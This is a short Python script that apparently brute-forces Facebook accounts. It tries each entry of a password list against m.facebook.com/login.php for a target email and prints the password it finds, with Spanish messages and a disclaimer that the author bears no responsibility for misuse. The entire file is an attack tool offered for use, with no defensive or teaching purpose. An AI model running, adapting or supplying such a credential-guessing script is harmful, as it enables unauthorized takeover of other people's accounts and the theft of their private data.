
import requests


class login ():
    
    def __init__(self , email , password):
        self.email = email
        self.password = password
        self.protected_url = 'https://m.facebook.com/groups/318395378171876?view=members'

    def login(self , session, email, password):
        response = session.post('https://m.facebook.com/login.php', data={
            'email': email,
            'pass': password
        }, allow_redirects=False)

        assert response.status_code == 302
        assert 'c_user' in response.cookies
        return response.cookies

def login_ (email , password):

    print('[!] Conectando con facebook  \n')
    
    contador = 0

    for passPosition in range(0,len(password)):
        contador = contador + 1
        try:
            loginObject = login(str(email) ,password[passPosition])
            session = requests.session()
            cookies = loginObject.login(session, loginObject.email,loginObject.password)
            response = session.get('https://m.facebook.com/groups/318395378171876?view=members', cookies=cookies, allow_redirects=False)
            assert response.text.find('Home')
            print('''

            #La contraseña a sido encontrada satisfactoria mente , recuerda que el creador
            #no se hace responsable por el mal uso que le des a esta herramienta ...

            ----------------------------

            Correo o Id : {}
            Contraseña : {}

            ----------------------------
            '''.format(email , password[passPosition]))
            break
        except Exception:
            print(" Probando contraseña ({}/{}) '{}'".format(contador , len(password) , password[passPosition]))


